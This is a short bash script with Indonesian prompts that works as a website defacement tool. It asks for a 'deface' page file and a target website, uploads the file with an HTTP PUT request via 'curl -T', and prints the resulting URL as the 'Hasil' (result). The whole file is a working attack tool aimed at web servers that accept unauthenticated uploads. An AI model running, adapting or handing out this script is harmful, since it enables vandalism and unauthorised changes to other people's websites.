#!/usr/bash

m="\033[1;31m"
b="\033[1;34m"
n="\033[0m"

echo ""
printf $b" Sc deface  : "$n
read sc
printf $m" Web Target : "$n
read web
echo " Loading... "
curl -T $sc $web
echo -e $b"Hasil > "$m$web$sc$n
